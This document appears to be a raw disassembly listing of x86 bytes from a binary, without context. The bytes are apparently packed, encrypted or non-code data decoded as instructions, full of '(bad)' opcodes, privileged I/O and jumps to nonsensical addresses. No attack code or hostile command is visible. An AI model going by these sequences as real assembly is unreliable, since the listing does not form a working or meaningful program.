  41e280:	ja     0x41e20a
  41e282:	mov    ch,0xad
  41e284:	push   esp
  41e285:	iret   
  41e286:	leave  
  41e287:	shl    dl,1
  41e289:	jno    0x41e2f7
  41e28b:	inc    edx
  41e28c:	xor    cl,dl
  41e28e:	mov    ebp,0x3ce1d1cd
  41e293:	ret    
  41e294:	fnstcw WORD PTR [edi+0x37]
  41e297:	sbb    al,bl
  41e299:	pop    ebx
  41e29a:	cdq    
  41e29b:	sbb    ch,BYTE PTR [eax+ebp*4+0x1a]
  41e29f:	retf   0x242
  41e2a2:	mov    eax,0xa09d403f
  41e2a7:	shl    eax,0xc4
  41e2aa:	fimul  WORD PTR [esi]
  41e2ac:	addr16 mov eax,ds:0x2a1a
  41e2b0:	popf   
  41e2b1:	jmp    0xdf4d34c1
  41e2b6:	into   
  41e2b7:	adc    DWORD PTR [eax+0x34],ebp
  41e2ba:	sub    BYTE PTR [eax-0x1b75d2bd],ch
  41e2c0:	xor    DWORD PTR [edx],edx
  41e2c2:	mov    ch,0xf
  41e2c4:	call   0x2ee62982
  41e2c9:	add    BYTE PTR [esi-0x5c],cl
  41e2cc:	lock fcomp DWORD PTR [edx]
  41e2cf:	mov    ebp,0x1217ae32
  41e2d4:	aaa    
  41e2d5:	push   0xffffffef
  41e2d7:	mov    ebx,0x169955ac
  41e2dc:	jmp    0x659c568b
  41e2e1:	mov    esi,0x83cbd5e7
  41e2e6:	adc    DWORD PTR [ebp+0x13],eax
  41e2e9:	mov    BYTE PTR [esi+0x6a],al
  41e2ec:	push   edx
  41e2ed:	ret    0x645b
  41e2f0:	mov    ebp,0xf9697327
  41e2f5:	jl     0x41e2bd
  41e2f7:	hlt    
  41e2f8:	cmp    DWORD PTR [eax+0x18],esi
  41e2fb:	shl    DWORD PTR [eax],0xca
  41e2fe:	enter  0x8880,0x5a
  41e302:	xchg   BYTE PTR [ebx+0x7c],bh
  41e305:	je     0x41e36d
  41e307:	and    edi,DWORD PTR [eax+0x7aa4b41]
  41e30d:	dec    edi
  41e30e:	adc    esp,DWORD PTR [esi+edx*1+0x69]
  41e312:	popf   
  41e313:	in     eax,dx
  41e314:	fs push eax
  41e316:	retf   0x3bb4
  41e319:	mov    al,0xf2
  41e31b:	call   0x11856c5c
  41e320:	jmp    0xde72:0x37575108
  41e327:	push   esi
  41e328:	dec    ebx
  41e329:	xchg   DWORD PTR [edx+edi*2],edi
  41e32c:	inc    edx
  41e32d:	jl     0x41e2b5
  41e32f:	mov    esi,0x6605e01c
  41e334:	sbb    BYTE PTR [eax],al
	...
  41e396:	mov    DWORD PTR [edx],edx
  41e398:	ja     0x41e3b9
  41e39a:	(bad)  
  41e39b:	jg     0x41e386
  41e39d:	xchg   esi,eax
  41e39e:	cmp    eax,0x62204855
  41e3a3:	sub    al,0x49
  41e3a5:	sbb    eax,0x13fef
  41e3aa:	pop    es
  41e3ab:	add    DWORD PTR [eax],eax
  41e3ad:	add    BYTE PTR [ecx+0x2c1449eb],ah
  41e3b3:	sbb    BYTE PTR [edx],dl
  41e3b5:	or     eax,DWORD PTR [esi+eax*1-0x3c]
  41e3b9:	or     al,0x18
  41e3bb:	add    eax,0xf11adca2
  41e3c0:	jp     0x41e3aa
  41e3c2:	loope  0x41e3b8
  41e3c4:	dec    edi
  41e3c5:	mov    dl,0x49
  41e3c7:	push   es
  41e3c8:	add    eax,0x35c8d66d
  41e3cd:	or     al,0x78
  41e3cf:	cmp    ch,ah
  41e3d1:	in     eax,0xfe
  41e3d3:	(bad)  
  41e3d4:	icebp  
  41e3d5:	ror    DWORD PTR [edx],1
  41e3d7:	jmp    0x41e455
  41e3d9:	and    esp,ecx
  41e3db:	(bad)
  41e3df:	in     eax,0xfa
  41e3e1:	xlat   BYTE PTR ds:[ebx]
  41e3e2:	inc    edx
  41e3e3:	push   esp
  41e3e4:	inc    ebp
  41e3e5:	leave  
  41e3e6:	fild   QWORD PTR [eax+0x57]
  41e3e9:	pushf  
  41e3ea:	mov    esi,0x25775480
  41e3ef:	adc    esi,0xffffff95
  41e3f2:	iret   
  41e3f3:	push   cs
  41e3f4:	mov    BYTE PTR [eax+0xc],bh
  41e3f7:	jecxz  0x41e3ad
  41e3f9:	sub    eax,edx
  41e3fb:	add    ah,cl
  41e3fd:	in     al,dx
  41e3fe:	pop    eax
  41e3ff:	test   al,0x8d
  41e401:	(bad)  
  41e402:	cdq    
  41e403:	mov    ds:0x90aa2750,al
  41e408:	mov    dh,0xac
  41e40a:	mov    bl,0xda
  41e40c:	inc    edx
  41e40d:	repnz push ebp
  41e40f:	rsqrtss xmm7,xmm2
  41e413:	adc    eax,0x97f4c8e9
  41e418:	cmp    DWORD PTR [eax],esi
  41e41a:	cmp    WORD PTR [edx+0x4fdd5002],di
  41e421:	imul   esi,edx,0x4df927de
  41e427:	rcr    BYTE PTR [ebp-0x58],cl
  41e42a:	push   edx
  41e42b:	les    ebp,FWORD PTR [eax-0x4d36bca1]
  41e431:	gs jmp 0x41e46b
  41e434:	push   ds
  41e435:	and    ebx,DWORD PTR [ecx+0x2f66fc]
  41e43b:	out    dx,eax
  41e43c:	jo     0x41e4ad
  41e43e:	sbb    eax,0xfdd7494f
  41e443:	jae    0x41e416
  41e445:	push   ebx
  41e446:	jecxz  0x41e417
  41e448:	mov    ah,0x38
  41e44a:	mov    bh,0x9a
  41e44c:	rol    DWORD PTR [edi+eax*8],cl
  41e44f:	ins    DWORD PTR es:[edi],dx
  41e450:	jecxz  0x41e42e
  41e452:	cld    
  41e453:	fldcw  WORD PTR [ebp-0x872ee71]
  41e459:	test   DWORD PTR [edx+0x59],edi
  41e45c:	ror    BYTE PTR [ecx+0x21feaf8e],1
  41e462:	sub    ebp,DWORD PTR [edi]
  41e464:	mov    ecx,0xed123a8b
  41e469:	mov    edi,0x440f4fe0
  41e46e:	mov    ebx,0x20e036b2
  41e473:	in     al,0x84
  41e475:	mov    eax,ds:0xa8b5cff8
  41e47a:	retf   
  41e47b:	outs   dx,DWORD PTR ds:[esi]
  41e47c:	jecxz  0x41e4ed
  41e47e:	pop    es
  41e47f:	dec    ecx
  41e480:	inc    ecx
  41e481:	sbb    esi,DWORD PTR [edx+0x79]
  41e484:	jge    0x41e422
  41e486:	and    DWORD PTR [ecx-0x18e507b1],esi
  41e48c:	mov    edx,0xeaf9089f
  41e491:	(bad)  
  41e493:	jae    0x41e4d3
  41e495:	repz pop ecx
  41e497:	and    esi,DWORD PTR [edx+eiz*4]
  41e49a:	cmp    DWORD PTR [edi-0x6fea1c4],ebx
  41e4a0:	sbb    al,0x29
  41e4a2:	mov    ecx,0xb9cd1418
  41e4a7:	bound  esp,QWORD PTR [eax+0x5d362278]
  41e4ad:	not    DWORD PTR [eax+0x23]
  41e4b0:	lea    eax,[ebp+0x2f]
  41e4b3:	jecxz  0x41e48e
	...
  41e515:	add    BYTE PTR [eax],ah
  41e517:	push   0xffffffcb
  41e519:	dec    ebx
  41e51a:	retf   
  41e51b:	jmp    0x41e4bd
  41e51d:	imul   ecx,DWORD PTR [edi+0x51],0xffffff9a
  41e521:	push   ss
  41e522:	cmp    ch,dh
  41e524:	shr    BYTE PTR [esi-0xa],cl
  41e527:	inc    eax
  41e528:	add    DWORD PTR [eax],eax
  41e52a:	pop    es
  41e52b:	add    DWORD PTR [eax],eax
  41e52d:	add    BYTE PTR [ebx-0x4d],al
  41e530:	out    dx,eax
  41e531:	nop
  41e532:	and    eax,0xc32e6338
  41e537:	cli    
  41e538:	mov    edi,0xed0ffc6d
  41e53d:	fist   WORD PTR ds:0xc13a50d
  41e543:	dec    ebp
  41e544:	in     eax,dx
  41e545:	cmp    DWORD PTR [esi+edi*4-0x6460cfda],esp
  41e54c:	push   esi
  41e54d:	dec    esi
  41e54e:	pop    es
  41e54f:	stc    
  41e550:	lock add ebx,ebp
  41e553:	div    BYTE PTR [ecx-0x2d8b87ab]
  41e559:	mov    eax,ds:0x3209b58a
  41e55e:	pop    ebx
  41e55f:	out    0x69,al
  41e561:	lahf   
  41e562:	stc    
  41e563:	mov    cl,0x55
  41e565:	push   ebx
  41e566:	adc    eax,0xead262fe
  41e56b:	mov    al,0xc2
  41e56d:	dec    edi
  41e56e:	dec    ebx
  41e56f:	inc    ebp
  41e570:	jo     0x41e54d
  41e572:	dec    edi
  41e573:	stc    
  41e574:	cli    
  41e575:	ror    ch,1
  41e577:	pop    eax
  41e578:	jle    0x41e51b
  41e57a:	ret    
  41e57b:	repz out 0xd6,al
  41e57e:	test   ebx,edx
  41e580:	dec    eax
  41e581:	cli    
  41e582:	inc    eax
  41e583:	sub    DWORD PTR [ebp-0x1b8d0f92],0xffffffe6
  41e58a:	add    ebx,eax
  41e58c:	retf   0x90eb
  41e58f:	icebp  
  41e590:	push   edi
  41e591:	out    0x39,al
  41e593:	(bad)  
  41e594:	mov    dh,0x50
  41e596:	shl    DWORD PTR [eax-0x37],0x76
  41e59a:	jle    0x41e5eb
  41e59c:	jmp    0xacf6bd66
  41e5a1:	cmc    
  41e5a2:	xor    cl,BYTE PTR [ebx+0x1aa65a1b]
  41e5a8:	sbb    ah,BYTE PTR [edi+eiz*2-0x3fa2f915]
  41e5af:	mov    ebx,0x61c3ddf6
  41e5b4:	jmp    FWORD PTR [ecx]
  41e5b6:	pusha  
  41e5b7:	sbb    eax,DWORD PTR [eax-0x23a60500]
  41e5bd:	cmc    
  41e5be:	pop    ds
  41e5bf:	fld    DWORD PTR [edx+ebp*2-0x48309277]
  41e5c6:	push   ss
  41e5c7:	dec    edi
  41e5c8:	pop    ebx
  41e5c9:	adc    al,0xd7
  41e5cb:	out    dx,al
  41e5cc:	or     DWORD PTR [ecx],esi
  41e5ce:	push   ds
  41e5cf:	enter  0xb221,0xfe
  41e5d3:	mov    ecx,0x594d0ddc
  41e5d8:	in     eax,0x85
  41e5da:	enter  0xc439,0xf1
  41e5de:	xchg   esi,eax
  41e5df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5e0:	div    DWORD PTR [ebx-0x1ec97216]
  41e5e6:	push   edi
  41e5e7:	and    al,0xed
  41e5e9:	mov    edx,0xe0042a1b
  41e5ee:	pushf  
  41e5ef:	xchg   DWORD PTR [esi],ebp
  41e5f1:	pushf  
  41e5f2:	sahf   
  41e5f3:	inc    ecx
  41e5f4:	pop    edi
  41e5f5:	stc    
  41e5f6:	aad    0x5d
  41e5f8:	int    0xcb
  41e5fa:	out    0x10,al
  41e5fc:	add    DWORD PTR [ecx],ebx
  41e5fe:	pop    es
  41e5ff:	leave  
  41e600:	loope  0x41e596
  41e602:	mov    ebp,0x6c2d96f0
  41e607:	aas    
  41e608:	xchg   edi,eax
  41e609:	frstor [eax]
  41e60b:	dec    eax
  41e60c:	pop    ds
  41e60d:	xchg   ecx,eax
  41e60e:	int    0xbb
  41e610:	inc    esi
  41e611:	add    esi,edi
  41e613:	or     dl,BYTE PTR [esi+0xc33b47e]
  41e619:	addr16 push edi
  41e61b:	sub    BYTE PTR ds:0x8507a820,cl
  41e621:	stos   BYTE PTR es:[edi],al
  41e622:	in     al,0x3f
  41e624:	fistp  QWORD PTR ds:0x917244a
  41e62a:	xchg   DWORD PTR ss:[ecx],esi
  41e62d:	xchg   ecx,eax
  41e62e:	ins    DWORD PTR es:[edi],dx
  41e62f:	xchg   BYTE PTR [esi-0x43a081c8],bl
	...
  41e695:	add    ch,al
  41e697:	cwde   
  41e698:	loope  0x41e6ef
  41e69a:	std    
  41e69b:	jge    0x41e692
  41e69d:	cwde   
  41e69e:	xchg   edx,eax
  41e69f:	fmul   st(5),st
  41e6a1:	mov    ds:0x9c0c1831,al
  41e6a6:	std    
  41e6a7:	inc    ecx
  41e6a8:	add    DWORD PTR [eax],eax
  41e6aa:	pop    es
  41e6ab:	add    DWORD PTR [eax],eax
  41e6ad:	add    BYTE PTR [edx+edi*8],dh
  41e6b0:	jle    0x41e6bc
  41e6b2:	arpl   WORD PTR [ebp-0x42],di
  41e6b5:	pop    esi
  41e6b6:	push   edx
  41e6b7:	inc    edx
  41e6b8:	xlat   BYTE PTR ds:[ebx]
  41e6b9:	stos   BYTE PTR es:[edi],al
  41e6ba:	(bad)  
  41e6bb:	push   0x92eda775
  41e6c0:	xor    DWORD PTR [eax+0x1],0x55e48904
  41e6c7:	cs int 0x24
  41e6ca:	out    0x2e,eax
  41e6cc:	or     BYTE PTR [eax-0x3a638b58],0x34
  41e6d3:	in     al,dx
  41e6d4:	jle    0x41e677
  41e6d6:	xchg   edx,eax
  41e6d7:	inc    ebp
  41e6d8:	mov    edx,ebp
  41e6da:	stos   BYTE PTR es:[edi],al
  41e6db:	ficom  WORD PTR [esi+0x2655e70d]
  41e6e1:	fimul  DWORD PTR [edi]
  41e6e3:	inc    ebp
  41e6e4:	xchg   ebx,eax
  41e6e5:	sbb    esp,DWORD PTR [edx+0x337e218e]
  41e6eb:	jbe    0x41e6fb
  41e6ed:	inc    ecx
  41e6ee:	xchg   BYTE PTR [esi-0x50],dl
  41e6f1:	in     al,0xd2
  41e6f3:	into   
  41e6f4:	pop    ds
  41e6f5:	add    cl,bl
  41e6f7:	shl    BYTE PTR [eax-0x28],0xca
  41e6fb:	add    DWORD PTR [eax],ebp
  41e6fd:	hlt    
  41e6fe:	mov    ch,0xfe
  41e700:	xchg   ebx,eax
  41e701:	dec    edi
  41e702:	ins    BYTE PTR es:[edi],dx
  41e703:	push   0x6f59349
  41e708:	pop    esi
  41e709:	popf   
  41e70a:	hlt    
  41e70b:	test   DWORD PTR [edx+0x67],esi
  41e70e:	retf   
  41e70f:	sbb    BYTE PTR [ebx+0x31],dh
  41e712:	adc    al,0x32
  41e714:	aam    0x14
  41e716:	leave  
  41e717:	adc    al,BYTE PTR [edx]
  41e719:	fnstenv [ebp-0xfa13cdf]
  41e71f:	xor    eax,0x772623f2
  41e724:	mov    dh,0x4d
  41e726:	(bad)  
  41e727:	stos   BYTE PTR es:[edi],al
  41e728:	push   esp
  41e729:	xchg   edx,eax
  41e72a:	or     BYTE PTR [eax-0x3e],dl
  41e72d:	push   ds
  41e72e:	fsub   DWORD PTR [esi+0x6f]
  41e731:	(bad)  
  41e732:	lahf   
  41e733:	jae    0x41e74e
  41e735:	sub    eax,0xc287d7a
  41e73a:	adc    esi,DWORD PTR [edx-0x5fb20d7e]
  41e740:	pushf  
  41e741:	clc    
  41e742:	cmp    ebp,DWORD PTR [ebp+0xc]
  41e745:	icebp  
  41e746:	out    0x74,eax
  41e748:	ficomp DWORD PTR [ebx-0x45a97c5c]
  41e74e:	push   edi
  41e74f:	das    
  41e750:	mov    al,ds:0x3315d59d
  41e755:	lahf   
  41e756:	add    ebp,DWORD PTR [ecx]
  41e758:	lds    esi,FWORD PTR [esi-0x66a3af27]
  41e75e:	xor    esp,DWORD PTR [esi+0x4cb4f619]
  41e764:	icebp  
  41e765:	fs mov edx,0xc570712b
  41e76b:	fcomp  DWORD PTR [ecx-0x558b41f8]
  41e771:	imul   edx,DWORD PTR [edx],0xb3744c7e
  41e777:	mov    dh,0x82
  41e779:	stos   BYTE PTR es:[edi],al
  41e77a:	inc    ebp
  41e77b:	retf   
  41e77c:	or     eax,0x8da36a4c
  41e781:	add    ecx,esp
  41e783:	test   BYTE PTR [edi+edx*8+0x243e6588],al
  41e78a:	sub    al,0x54
  41e78c:	inc    ebx
  41e78d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e78e:	lods   al,BYTE PTR ds:[esi]
  41e78f:	test   ebp,esi
  41e791:	mov    edi,0x8b217320
  41e796:	push   cs
  41e797:	fmul   st(4),st
  41e799:	icebp  
  41e79a:	les    eax,FWORD PTR [ebp-0x38]
  41e79d:	jmp    0xabe48b41
  41e7a2:	cmp    al,0x5
  41e7a4:	mov    ah,0xcd
  41e7a6:	adc    ebx,DWORD PTR [ecx-0x2b]
  41e7a9:	sbb    ebx,DWORD PTR [ecx-0x67]
  41e7ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7ad:	popf   
  41e7ae:	push   ebp
  41e7af:	and    al,0x98
  41e7b1:	xor    dh,BYTE PTR [edx+edi*2+0x7f]
	...
  41e815:	add    BYTE PTR ds:0x9e5c8a39,ch
  41e81b:	(bad)  
  41e81c:	(bad)  
  41e81d:	jns    0x41e875
  41e81f:	imul   ebx,DWORD PTR [esi+eiz*2],0x52
  41e823:	lods   al,BYTE PTR ds:[esi]
  41e824:	shl    ecx,1
  41e826:	add    al,0x43
  41e828:	add    DWORD PTR [eax],eax
  41e82a:	pop    es
  41e82b:	add    DWORD PTR [eax],eax
  41e82d:	add    BYTE PTR [edx-0x1b],ch
  41e830:	add    BYTE PTR ds:0x690f2595,ah
  41e836:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e837:	test   BYTE PTR [ebp-0x4c2eddd3],dh
  41e83d:	jns    0x41e88c
  41e83f:	adc    al,BYTE PTR [edi+eiz*2]
  41e842:	iret   
  41e843:	pushf  
  41e844:	test   DWORD PTR [edx+edi*4],edi
  41e847:	mov    ecx,0x3af55bcb
  41e84c:	mov    edx,0xb931cdb0
  41e851:	xchg   ecx,eax
  41e852:	ror    DWORD PTR [ecx+0x2262ddb4],cl
  41e858:	mov    ebx,0x3a7a70ce
  41e85d:	adc    BYTE PTR [esi-0x5c4a163f],0x3c
  41e864:	push   edx
  41e865:	std    
  41e866:	out    dx,eax
  41e867:	mov    ch,0xbc
  41e869:	ins    DWORD PTR es:[edi],dx
  41e86a:	js     0x41e81d
  41e86c:	lock sub eax,0x1bfb635a
  41e872:	out    0xb6,al
  41e874:	int3   
  41e875:	loop   0x41e8ad
  41e877:	into   
  41e878:	xchg   edi,eax
  41e879:	jmp    FWORD PTR [ecx+eax*1]
  41e87c:	pop    edi
  41e87d:	mov    al,0x2b
  41e87f:	or     ecx,DWORD PTR [edx-0x203516c6]
  41e885:	stos   BYTE PTR es:[edi],al
  41e886:	gs in  eax,dx
  41e888:	xor    al,0xa9
  41e88a:	adc    bh,BYTE PTR [eax]
  41e88c:	sub    BYTE PTR [ecx-0x47],dh
  41e88f:	std    
  41e890:	mov    cl,bh
  41e892:	and    eax,0x9fa71304
  41e897:	and    BYTE PTR [eax-0x1],ch
  41e89a:	rol    ch,1
  41e89c:	repz je 0x41e868
  41e89f:	lock imul edi,DWORD PTR [edx+ebx*1+0x50],0xd94b265c
  41e8a8:	cli    
  41e8a9:	sbb    bl,BYTE PTR [edi+esi*2-0x3face43a]
  41e8b0:	push   0xdb0228d1
  41e8b5:	adc    BYTE PTR [edi-0x45],cl
  41e8b8:	sub    al,BYTE PTR [esi-0x788b4fd1]
  41e8be:	mov    bl,0x55
  41e8c0:	push   ds
  41e8c1:	clc    
  41e8c2:	inc    edi
  41e8c3:	jmp    0xf4482eb2
  41e8c8:	fs pop ebx
  41e8ca:	xor    bl,BYTE PTR [eax]
  41e8cc:	loope  0x41e8f1
  41e8ce:	or     ch,BYTE PTR [eax]
  41e8d0:	std    
  41e8d1:	test   al,0x87
  41e8d3:	pushf  
  41e8d4:	(bad)  
  41e8d5:	xor    al,0x42
  41e8d7:	mov    eax,ds:0xfee91901
  41e8dc:	fiadd  WORD PTR [ebx-0x640ff482]
  41e8e2:	pop    ebp
  41e8e3:	gs loopne 0x41e952
  41e8e6:	add    al,0x37
  41e8e8:	in     al,0x56
  41e8ea:	adc    ebp,edx
  41e8ec:	cmp    bl,BYTE PTR [esi+edx*2-0x6]
  41e8f0:	pop    es
  41e8f1:	xchg   BYTE PTR [edx-0x6c],dl
  41e8f4:	add    al,0x28
  41e8f6:	or     al,0xdb
  41e8f8:	or     al,0xa6
  41e8fa:	ins    BYTE PTR es:[edi],dx
  41e8fb:	mov    WORD PTR [edx+0xb34aad9],?
  41e901:	mov    eax,ds:0x392ac617
  41e906:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e907:	or     BYTE PTR [eax+0x52],bh
  41e90a:	jmp    0x41e8d5
  41e90c:	popf   
  41e90d:	test   eax,0xa864ee6f
  41e912:	pop    edi
  41e913:	cdq    
  41e914:	or     ch,al
  41e916:	push   ds
  41e917:	aaa    
  41e918:	stc    
  41e919:	les    ebx,FWORD PTR [esp+esi*8+0x4859b868]
  41e920:	jb     0x41e980
  41e922:	and    ch,BYTE PTR [ebp-0x6e]
  41e925:	dec    eax
  41e926:	or     edx,DWORD PTR [edi+0x21cabda4]
  41e92c:	in     al,0x5e
  41e92e:	fimul  DWORD PTR [esi+0x5170595f]
  41e934:	int3   
	...
  41e995:	add    BYTE PTR [eax-0x3],bh
  41e998:	ret    0xc766
  41e99b:	jg     0x41e999
  41e99d:	(bad)  
  41e99e:	jmp    0x41e94c
  41e9a0:	repnz xchg ecx,eax
  41e9a2:	loope  0x41e9de
  41e9a4:	jl     0x41ea03
  41e9a6:	or     eax,DWORD PTR [ecx+eax*1+0x0]
  41e9aa:	pop    es
  41e9ab:	add    DWORD PTR [eax],eax
  41e9ad:	add    BYTE PTR [edx+0x3f51b661],ah
  41e9b3:	fild   QWORD PTR [ecx]
  41e9b5:	out    0xe1,al
  41e9b7:	mov    bh,0x5d
  41e9b9:	mov    ecx,0xae8f9579
  41e9be:	dec    ebx
  41e9bf:	and    esi,DWORD PTR [edx]
  41e9c1:	fsub   DWORD PTR [ecx+edi*8+0x525b19f8]
  41e9c8:	cld    
  41e9c9:	test   eax,0x2f64367
  41e9ce:	add    eax,DWORD PTR [ecx+0x28]
  41e9d1:	pop    edi
  41e9d2:	fincstp 
  41e9d4:	dec    eax
  41e9d5:	fsubr  DWORD PTR [eax]
  41e9d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9d8:	inc    esi
  41e9d9:	out    0xe3,eax
  41e9db:	pop    edx
  41e9dc:	push   ss
  41e9dd:	pop    edx
  41e9de:	arpl   WORD PTR [esi-0x7d3644a0],sp
  41e9e4:	sub    al,0xc5
  41e9e6:	or     eax,0xa02d720f
  41e9eb:	shr    BYTE PTR [ebx-0x80],cl
  41e9ee:	gs into 
  41e9f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9f1:	(bad)  
  41e9f2:	jg     0x41ea08
  41e9f4:	mov    esi,0x4a75f1c3
  41e9f9:	adc    al,0x0
  41e9fb:	int3   
  41e9fc:	lahf   
  41e9fd:	cmp    al,0x10
  41e9ff:	sbb    DWORD PTR [ebx-0x6a41dac3],ebx
  41ea05:	add    cl,BYTE PTR [ecx-0x76]
  41ea08:	(bad)  
  41ea09:	jnp    0x41ea13
  41ea0b:	add    DWORD PTR [eax+edx*4-0x69],ebx
  41ea0f:	mov    ah,0x4c
  41ea11:	mov    dh,0xb0
  41ea13:	test   BYTE PTR [eax-0x2a0886ae],bl
  41ea19:	or     BYTE PTR [esi+0x557b892a],ch
  41ea1f:	jg     0x41ea47
  41ea21:	xor    cl,BYTE PTR [ecx-0x49889f3]
  41ea27:	lods   eax,DWORD PTR ds:[esi]
  41ea28:	popa   
  41ea29:	(bad)  
  41ea2a:	jmp    DWORD PTR [eax+0x4b98b77]
  41ea30:	dec    ebp
  41ea31:	jmp    0x5a4a:0x7f661f7b
  41ea38:	sbb    eax,0x16d4e71e
  41ea3d:	mov    bl,al
  41ea3f:	fist   DWORD PTR [edx]
  41ea41:	inc    edx
  41ea42:	leave  
  41ea43:	jl     0x41e9d5
  41ea45:	pusha  
  41ea46:	gs jae 0x41ea6f
  41ea49:	cmp    al,BYTE PTR [eax-0x6c604c0e]
  41ea4f:	enter  0x2a1c,0x1c
  41ea53:	out    0x51,al
  41ea55:	mov    edi,0xda7c1990
  41ea5a:	dec    edi
  41ea5b:	inc    esp
  41ea5c:	dec    esp
  41ea5d:	iret   
  41ea5e:	cmp    ah,BYTE PTR [esi]
  41ea60:	repz iret 
  41ea62:	add    al,0xc6
  41ea64:	ins    BYTE PTR es:[edi],dx
  41ea65:	repz (bad) 
  41ea67:	shr    bl,0x80
  41ea6a:	and    bh,BYTE PTR [edi]
  41ea6c:	inc    edi
  41ea6d:	sar    BYTE PTR [esi-0x56],0xac
  41ea71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea72:	jb     0x41eab8
  41ea74:	push   cs
  41ea75:	cmc    
  41ea76:	push   edi
  41ea77:	in     al,dx
  41ea78:	into   
  41ea79:	xor    eax,0x19efccdb
  41ea7e:	and    eax,0x56318303
  41ea83:	and    eax,0xf3ccb09
  41ea88:	fsin   
  41ea8a:	sahf   
  41ea8b:	hlt    
  41ea8c:	pop    ss
  41ea8d:	stos   DWORD PTR es:[edi],eax
  41ea8e:	pop    ss
  41ea8f:	mov    ebp,0xbdb8a9d
  41ea94:	rcr    ch,1
  41ea96:	leave  
  41ea97:	imul   eax,ecx,0x49
  41ea9a:	jmp    0x41ea5e
  41ea9c:	in     eax,0xeb
  41ea9e:	pop    ds
  41ea9f:	pop    ebp
  41eaa0:	fiadd  DWORD PTR [ebx+0x1c]
  41eaa3:	popa   
  41eaa4:	repnz push esi
  41eaa6:	push   eax
  41eaa7:	and    al,0x25
  41eaa9:	jae    0x41ea7e
  41eaab:	xor    DWORD PTR [ebx-0x26c04e2f],edi
  41eab1:	sub    ch,bh
  41eab3:	push   esp
  41eab4:	mov    edi,0x0
	...
  41eb15:	add    BYTE PTR [edx],dl
  41eb17:	das    
  41eb18:	mov    esi,DWORD PTR [edi+edi*4+0x22af3fb4]
  41eb1f:	and    ebp,DWORD PTR [eax]
  41eb21:	(bad)  
  41eb23:	mov    ebp,DWORD PTR ds:0x14512a3
  41eb29:	add    BYTE PTR [edi],al
  41eb2b:	add    DWORD PTR [eax],eax
  41eb2d:	add    BYTE PTR [eax-0x80],al
  41eb30:	dec    esp
  41eb31:	mov    dl,BYTE PTR [edx]
  41eb33:	nop
  41eb34:	pop    edx
  41eb35:	faddp  st(2),st
  41eb37:	sub    al,BYTE PTR [eax]
  41eb39:	mov    DWORD PTR [edx+0x54],edx
  41eb3c:	or     ebp,DWORD PTR [eax+0x19]
  41eb3f:	out    dx,eax
  41eb40:	call   0x2f5f:0x5570c857
  41eb47:	es pop edi
  41eb49:	inc    DWORD PTR [edi+edi*2+0x47]
  41eb4d:	mov    edi,0x6bded6be
  41eb52:	mov    bh,0x67
  41eb54:	sbb    BYTE PTR [edx],ah
  41eb56:	add    ebx,DWORD PTR [edx]
  41eb58:	cwde   
  41eb59:	ins    BYTE PTR es:[edi],dx
  41eb5a:	adc    al,0xd0
  41eb5c:	mov    bl,0x2e
  41eb5e:	ins    BYTE PTR es:[edi],dx
  41eb5f:	fimul  WORD PTR [edx-0x5d5062e7]
  41eb65:	adc    esi,DWORD PTR [esi+ebx*4]
  41eb68:	sbb    dh,BYTE PTR [esi]
  41eb6a:	repz repnz cdq 
  41eb6d:	cmp    BYTE PTR [edi-0x6dba83c9],al
  41eb73:	cmp    ebp,DWORD PTR [eax]
  41eb75:	(bad)  
  41eb76:	in     al,dx
  41eb77:	push   edi
  41eb78:	pop    eax
  41eb79:	aaa    
  41eb7a:	dec    esi
  41eb7b:	or     al,0x48
  41eb7d:	jmp    0xefb6:0xac95c095
  41eb84:	fimul  WORD PTR [edx-0x36]
  41eb87:	mov    al,0x78
  41eb89:	cmp    eax,0x7fb3b240
  41eb8e:	pop    eax
  41eb8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb90:	pop    ss
  41eb91:	cmp    DWORD PTR es:[esi+0x33],0x13
  41eb96:	pop    ss
  41eb97:	loopne 0x41eb94
  41eb99:	dec    ecx
  41eb9a:	inc    edi
  41eb9b:	mov    esi,0xc330b26d
  41eba0:	and    ebx,edx
  41eba2:	nop
  41eba3:	add    dh,BYTE PTR [esi-0x7142ca9f]
  41eba9:	cdq    
  41ebaa:	dec    cl
  41ebac:	neg    DWORD PTR [edi]
  41ebae:	sub    BYTE PTR [edx+edx*8],bh
  41ebb1:	push   0xffffff9e
  41ebb3:	aas    
  41ebb4:	rep lods eax,DWORD PTR ds:[esi]
  41ebb6:	sbb    BYTE PTR [edx-0x1],bl
  41ebb9:	jae    0x41ebc5
  41ebbb:	mov    cl,0x41
  41ebbd:	mov    al,0xae
  41ebbf:	mov    al,0x69
  41ebc1:	mov    edx,0x4a6de935
  41ebc6:	cmp    DWORD PTR [ebx],ebx
  41ebc8:	fcom   QWORD PTR [ebp+0x65]
  41ebcb:	push   ecx
  41ebcc:	cmp    eax,DWORD PTR [edx+0x6ef9405f]
  41ebd2:	mov    ebp,0x4813271d
  41ebd7:	sbb    bh,BYTE PTR [ecx]
  41ebd9:	bound  ebp,QWORD PTR [esi+ebx*2]
  41ebdc:	push   ds
  41ebdd:	stos   DWORD PTR es:[edi],eax
  41ebde:	mov    edx,0xc9c21ef0
  41ebe3:	push   ds
  41ebe4:	imul   esp,DWORD PTR [edx],0x7a
  41ebe7:	xlat   BYTE PTR ds:[ebx]
  41ebe8:	sahf   
  41ebe9:	clc    
  41ebea:	cmp    BYTE PTR [ecx+0x3d],ch
  41ebed:	iret   
  41ebee:	pop    ebx
  41ebef:	sbb    eax,0xd607a2bd
  41ebf4:	(bad)  
  41ebf5:	xchg   ebx,eax
  41ebf6:	(bad)
  41ebfa:	mov    al,0x1a
  41ebfc:	aam    0xb0
  41ebfe:	sbb    bh,BYTE PTR [eax+0x119d687c]
  41ec04:	sti    
  41ec05:	dec    edi
  41ec06:	rcl    DWORD PTR [edx-0x47],1
  41ec09:	test   BYTE PTR ds:0x26d1f66d,0xa2
  41ec10:	mov    eax,ds:0xcdb2d910
  41ec15:	in     eax,0x16
  41ec17:	push   edi
  41ec18:	cmp    ebx,DWORD PTR [edi-0x35]
  41ec1b:	mov    esi,DWORD PTR [esi]
  41ec1d:	mov    al,ds:0xb61ef240
  41ec22:	(bad)  
